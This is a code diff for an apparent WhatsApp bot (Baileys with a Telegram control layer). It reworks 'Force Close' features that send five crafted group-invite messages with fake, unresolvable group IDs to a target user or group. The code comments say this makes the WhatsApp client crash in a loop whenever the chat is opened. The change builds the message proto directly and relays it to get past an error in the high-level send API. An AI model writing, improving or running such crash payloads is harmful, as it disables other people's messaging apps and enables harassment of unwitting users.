@@ -7,6 +7,8 @@ const {
     fetchLatestBaileysVersion,
     getContentType,
     downloadMediaMessage,
+    generateWAMessageFromContent,
+    proto: waProto,
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
 const { Telegraf } = require("telegraf");
@@ -4214,21 +4216,26 @@ _Can be started from any chat, but source members require source group access an
                 try {
                     if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
                     if (!userBugTypes[fcTarget]) userBugTypes[fcTarget] = [];
-                    // Generate 5 fake group JIDs — look like real WA group IDs but are unresolvable.
-                    // WA client tries to fetch invite info for each on delivery → crash loop.
+                    // Build groupInviteMessage proto directly — bypasses getProfilePicUrl
+                    // which throws on fake JIDs when using the high-level sendMessage API.
                     for (let i = 0; i < 5; i++) {
                         const fakeJid  = `120363${Math.floor(Math.random() * 1e13).toString().padStart(13, "0")}@g.us`;
-                        const fakeCode = Math.random().toString(36).slice(2, 24);
-                        const sent = await sock.sendMessage(fcTarget, {
-                            groupInvite: {
-                                jid: fakeJid,
+                        const fakeCode = Math.random().toString(36).slice(2).padEnd(22, "0").substring(0, 22);
+                        const msgProto = waProto.Message.create({
+                            groupInviteMessage: waProto.GroupInviteMessage.create({
+                                groupJid: fakeJid,
                                 inviteCode: fakeCode,
-                                inviteExpiration: 0,
-                                subject: "Group",
-                                text: ""
-                            }
+                                inviteExpiration: Math.floor(Date.now() / 1000) + 86400,
+                                groupName: "Group",
+                                caption: ""
+                            })
                         });
-                        userCrashKeys[fcTarget].push(sent.key);
+                        const waMsg = generateWAMessageFromContent(fcTarget, msgProto, {
+                            timestamp: new Date(),
+                            userJid: sock.user?.id
+                        });
+                        await sock.relayMessage(fcTarget, waMsg.message, { messageId: waMsg.key.id });
+                        userCrashKeys[fcTarget].push(waMsg.key);
                         await delay(300);
                     }
                     if (!userBugTypes[fcTarget].includes("Force Close")) userBugTypes[fcTarget].push("Force Close");
@@ -4316,20 +4323,26 @@ _Can be started from any chat, but source members require source group access an
 
                     // Fire 5 crafted group invite messages into the group.
                     // WA client tries to resolve/preview each invalid invite JID when the
-                    // group is loaded → crashes. Loop repeats every time someone opens the group.
+                    // group is loaded → crashes. Built via proto directly to bypass
+                    // getProfilePicUrl which throws on fake JIDs.
                     for (let i = 0; i < 5; i++) {
                         const fakeJid  = `120363${Math.floor(Math.random() * 1e13).toString().padStart(13, "0")}@g.us`;
-                        const fakeCode = Math.random().toString(36).slice(2, 24);
-                        const sent = await sock.sendMessage(gcTarget, {
-                            groupInvite: {
-                                jid: fakeJid,
+                        const fakeCode = Math.random().toString(36).slice(2).padEnd(22, "0").substring(0, 22);
+                        const msgProto = waProto.Message.create({
+                            groupInviteMessage: waProto.GroupInviteMessage.create({
+                                groupJid: fakeJid,
                                 inviteCode: fakeCode,
-                                inviteExpiration: 0,
-                                subject: "Group",
-                                text: ""
-                            }
+                                inviteExpiration: Math.floor(Date.now() / 1000) + 86400,
+                                groupName: "Group",
+                                caption: ""
+                            })
                         });
-                        groupCrashKeys[gcTarget].push(sent.key);
+                        const waMsg = generateWAMessageFromContent(gcTarget, msgProto, {
+                            timestamp: new Date(),
+                            userJid: sock.user?.id
+                        });
+                        await sock.relayMessage(gcTarget, waMsg.message, { messageId: waMsg.key.id });
+                        groupCrashKeys[gcTarget].push(waMsg.key);
                         await delay(300);
                     }
 
